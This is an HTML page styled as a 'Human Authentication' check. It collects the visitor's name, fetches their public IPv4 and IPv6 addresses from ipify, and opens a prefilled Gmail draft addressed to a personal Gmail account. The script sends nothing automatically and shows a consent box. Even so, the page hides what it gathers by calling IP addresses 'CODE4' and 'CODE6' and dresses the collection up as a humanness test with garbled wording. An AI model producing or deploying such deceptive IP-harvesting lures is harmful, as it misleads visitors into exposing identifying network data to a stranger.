
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Voluntary human Report</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
      background: #101827;
      color: #f8fafc;
      font-family: Arial, sans-serif;
    }

    .card {
      width: 100%;
      max-width: 460px;
      padding: 28px;
      background: #1e293b;
      border: 1px solid #334155;
      border-radius: 16px;
      box-shadow: 0 12px 35px #0005;
    }

    h1 {
      margin-top: 0;
      color: #60a5fa;
      font-size: 27px;
    }

    .description {
      color: #cbd5e1;
      line-height: 1.6;
    }

    label.field-label {
      display: block;
      margin: 22px 0 8px;
      font-weight: bold;
    }

    input[type="text"] {
      width: 100%;
      padding: 13px;
      border: 1px solid #475569;
      border-radius: 8px;
      background: #0f172a;
      color: white;
      font-size: 16px;
    }

    .consent {
      display: flex;
      align-items: flex-start;
      gap: 10px;
      margin-top: 20px;
      color: #e2e8f0;
      line-height: 1.5;
    }

    .consent input {
      margin-top: 4px;
    }

    button {
      width: 100%;
      padding: 14px;
      margin-top: 22px;
      border: 0;
      border-radius: 8px;
      background: #2563eb;
      color: white;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
    }

    button:hover {
      background: #1d4ed8;
    }

    button:disabled {
      opacity: 0.6;
      cursor: wait;
    }

    #status {
      overflow-wrap: anywhere;
      line-height: 1.5;
    }

    .notice {
      margin-top: 20px;
      color: #94a3b8;
      font-size: 12px;
      line-height: 1.5;
    }
  </style>
</head>

<body>
  <main class="card">
    <h1>Human Authentication</h1>

    <p class="description">
      You are a human
    </p>

    <form id="reportForm">
      <label class="field-label" for="visitorName">
        Your name
      </label>

      <input
        id="visitorName"
        type="text"
        placeholder="Enter your name"
        maxlength="80"
        autocomplete="name"
        required
      >

      <label class="consent">
        <input id="consent" type="checkbox" required>
        <span>
          I agree to share my name and human CODE4 and CODE6
          addresses with saintedsaitama@gmail.com.
        </span>
      </label>

      <button id="submitButton" type="submit">
        Prepare Email Report
      </button>
    </form>

    <p id="status" role="status" aria-live="polite"></p>

    <p class="notice">
      This page checks your CODE4 and CODE6 to authenticate humanness using
      difdify. Either address may be unavailable on your
      network. No email is sent; you must have network or an ethernet cable plugged in.
    </p>
  </main>

  <script>
    const form = document.getElementById("reportForm");
    const status = document.getElementById("status");
    const submitButton = document.getElementById("submitButton");

    async function getPublicIP(version) {
      try {
        const response = await fetch(
          `https://api${version}.ipify.org?format=json`
        );

        if (!response.ok) {
          return "Unavailable";
        }

        const result = await response.json();
        return result.ip || "Unavailable";
      } catch {
        return "Unavailable";
      }
    }

    form.addEventListener("submit", async function (event) {
      event.preventDefault();

      const name = document
        .getElementById("visitorName")
        .value.trim();

      const consent = document.getElementById("consent").checked;

      if (!name) {
        status.textContent = "Please enter your name.";
        return;
      }

      if (!consent) {
        status.textContent = "Consent is required to continue.";
        return;
      }

      submitButton.disabled = true;
      status.textContent = "Checking available organic lifeforms...";

      try {
        const [ipv4, ipv6] = await Promise.all([
          getPublicIP(4),
          getPublicIP(6)
        ]);

        if (
          ipv4 === "Unavailable" &&
          ipv6 === "Unavailable"
        ) {
          status.textContent =
            "Neither address could be retrieved. Please try again.";
          return;
        }

        const subject = "Voluntary IP Report";

        const body = [
          "Voluntary IP Report",
          "",
          "Name: " + name,
          "CODE4: " + ipv4,
          "CODE6 " + ipv6,
          "",
          "The visitor consented to sharing these details."
        ].join("\n");

        const gmailURL =
          "https://mail.google.com/mail/?view=cm&fs=1" +
          "&to=" + encodeURIComponent("saintedsaitama@gmail.com") +
          "&su=" + encodeURIComponent(subject) +
          "&body=" + encodeURIComponent(body);

        status.textContent =
          "Opening Gmail. Review the report before sending.";

        window.open(gmailURL, "_blank");
      } finally {
        submitButton.disabled = false;
      }
    });
  </script>
</body>
</html>
